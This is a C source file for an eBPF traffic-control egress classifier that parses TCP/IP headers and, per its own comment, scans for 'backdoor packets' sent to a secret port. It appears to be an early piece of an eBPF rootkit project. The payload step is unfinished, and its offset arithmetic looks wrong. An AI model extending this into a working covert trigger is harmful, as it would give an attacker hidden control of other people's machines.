#include <linux/bpf.h>
#include <linux/pkt_cls.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <arpa/inet.h>
#include <linux/swab.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_helpers.h>

#include "../../../common/constants.h"

SEC("classifier/egress")
int classifier(struct __sk_buff *skb){
	void *data = (void *)(__u64)skb->data;
	void *data_end = (void *)(__u64)skb->data_end;
    bpf_printk("TC egress classifier called\n");
	
	//We are interested on parsing TCP/IP packets so let's assume we have one
	//Ethernet header
	struct ethhdr *eth = data;
	if ((void *)eth + sizeof(struct ethhdr) > data_end){
        bpf_printk("ETH\n");
		return TC_ACT_OK;
    }
	if(eth->h_proto != htons(ETH_P_IP)){
		//Not an IP packet
		bpf_printk("IP\n");
		return TC_ACT_OK;
	}

	//IP header
	struct iphdr *ip = (struct iphdr*)(data + sizeof(struct ethhdr));
	if ((void *)ip + sizeof(struct iphdr) > data_end){
		bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data, data_end);
        return TC_ACT_OK;
    }
	if(ip->protocol != IPPROTO_TCP){
		bpf_printk("TCP\n");
		return TC_ACT_OK;
	}

	//TCP header
	struct tcphdr *tcp = (struct tcphdr *)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
	if ((void *)tcp + sizeof(struct tcphdr) > data_end){
		bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
    }

	//We now proceed to scan for our backdoor packets
	__u16 dest_port = ntohs(tcp->dest);
	if(dest_port != SECRET_PACKET_DEST_PORT){
		bpf_printk("PORT CHECK\n");
		return TC_ACT_OK;
	}

	bpf_printk("Detected bounds: data:%llx, data_end:%llx", data, data_end);
	bpf_printk("Detected headers: \n\teth:%llx\n\tip:%llx\n\ttcp:%llx\n", eth, ip, tcp);

	//Mark skb buffer readable and writable

	__u32 payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
    bpf_printk("ip_totlen: %u, tcp_doff*4: %u, ip_ihl: %u\n", ntohs(ip->tot_len), tcp->doff*4, ip->ihl*4);
	char* payload = (void *)(tcp + tcp->doff*4);
	if ((void*)payload + payload_size > data_end){
		bpf_printk("PAYLOAD CHECK, payload:%llx, payload_size:%llx, data_end:%llx\n", payload, payload_size, data_end);
        return TC_ACT_OK;
    }
	bpf_skb_pull_data(skb, 0);

	bpf_printk("PAYLOAD size: %u\n", payload_size);
	



	return TC_ACT_OK;
	
}

/**
 * COMMANDS
 * sudo tc qdisc add dev lo clsact
 * sudo tc filter add dev lo egress bpf direct-action obj tc.o sec classifier/egress
 * sudo tc filter show dev lo
 * sudo tc filter show dev lo egress
 * 
 * tc qdisc del dev lo clsact
 */



char _license[4] SEC("license") = "GPL";